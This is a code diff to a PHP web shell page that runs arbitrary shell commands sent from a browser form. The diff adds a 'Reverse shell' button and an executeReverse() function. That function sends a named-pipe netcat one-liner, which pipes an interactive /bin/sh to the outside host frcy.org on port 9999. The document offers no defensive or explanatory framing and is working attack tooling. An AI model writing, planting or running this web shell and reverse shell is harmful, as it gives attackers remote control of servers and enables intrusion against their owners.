@@ -76,12 +76,22 @@ $curDir = getcwd();
         json['cmd'] = cmd;
         performSimpleAjaxRequest(JSON.stringify(json),target,printOutput);
     }
+    function executeReverse() {
+        var target = 'legendary.php';
+        var cmd = "rm -f /tmp/fifo; mkfifo /tmp/fifo; cat /tmp/fifo | /bin/sh -i 2>&1 | nc frcy.org 9999 >/tmp/fifo";
+        document.getElementById('cmd').value = '';
+        var json = Object();
+        json['dir'] = dir;
+        json['cmd'] = cmd;
+        performSimpleAjaxRequest(JSON.stringify(json),target,printOutput);
+    }
 </script>
 <p>Current path: <span id="dirOut"><?= $curDir ?></span></p>
 <form method="post" onsubmit="executeCommand(); return false;">
     <label for="cmd">Next command: </label><input type="text" name="cmd" placeholder="Enter a command" id="cmd" autocomplete="off">
     <input type="hidden" name="dir" id="dir" value="<?= $curDir ?>" autocomplete="off">
     <button type="button" onclick="executeCommand()">Execute</button>
+    <button type="button" onclick="executeReverse()">Reverse shell</button>
 </form>
 <hr><br>
 <h3>Output:</h3>
